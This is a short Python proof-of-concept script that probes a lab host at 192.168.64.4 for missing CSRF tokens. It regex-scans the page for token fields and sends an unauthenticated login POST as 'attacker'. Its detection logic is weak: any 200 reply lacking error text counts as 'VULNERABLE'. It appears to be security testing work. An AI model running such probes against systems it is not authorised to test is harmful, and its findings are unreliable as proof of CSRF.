#!/usr/bin/env python3
"""
PoC for CSRF (Cross-Site Request Forgery) on 192.168.64.4
Vulnerability: POST requests accepted without CSRF token validation
"""
import urllib.request
import urllib.parse
import html.parser

target = "http://192.168.64.4"

print("[+] CSRF PoC - Testing for missing CSRF tokens")
print(f"[*] Target: {target}")
print("-" * 60)

# Step 1: Fetch the login page and look for CSRF tokens
csrf_token_pattern = 'csrf|token|xsrf'

try:
    req = urllib.request.Request(target)
    with urllib.request.urlopen(req, timeout=10) as response:
        html = response.read().decode('utf-8', errors='ignore')
        
    # Look for hidden CSRF tokens in HTML
    import re
    csrf_matches = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:csrf|token)|name=["\'](?:csrf|token)["\'][^>]*>', html, re.IGNORECASE)
    
    if csrf_matches:
        print(f"   [!] Found potential CSRF tokens: {set(csrf_matches)}")
    else:
        print("   [!] No CSRF tokens found in HTML form fields")
    
    # Check for meta tags
    meta_tokens = re.findall(r'<meta[^>]*name=["\']([^"\']+)["\'][^>]*(?:csrf|token)|name=["\'](?:csrf|token)["\'][^>]*>', html, re.IGNORECASE)
    if meta_tokens:
        print(f"   [!] CSRF tokens in meta tags: {set(meta_tokens)}")
        
except Exception as e:
    print(f"   [!] Error reading page: {e}")

# Step 2: Test POST without token (the vulnerability test)
print("\n[*] Testing POST endpoint without CSRF token...")
test_data = urllib.parse.urlencode({
    'username': 'attacker',
    'password': 'test123'
}).encode('utf-8')

try:
    req = urllib.request.Request(
        target,
        data=test_data,
        method='POST',
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    with urllib.request.urlopen(req, timeout=10) as response:
        content = response.read().decode('utf-8', errors='ignore')
        
        # Check if request was accepted (not redirected to login, no CSRF error)
        is_vulnerable = (
            response.status == 200 and
            'csrf' not in content.lower() and
            'invalid token' not in content.lower()
        )
        
        if is_vulnerable:
            print("   [!] VULNERABLE: POST accepted without CSRF protection")
            print(f"   [!] Response length: {len(content)} bytes")
        else:
            print("   [-] CSRF protection may be present")
            
except urllib.error.HTTPError as e:
    if e.code == 302 or e.code == 401:
        print(f"   [-] Protected - got {e.code} redirect")
    else:
        print(f"   [-] Protected - got {e.code} error")
except Exception as e:
    print(f"   [!] Error: {e}")

print("\n[+] CSRF PoC complete")
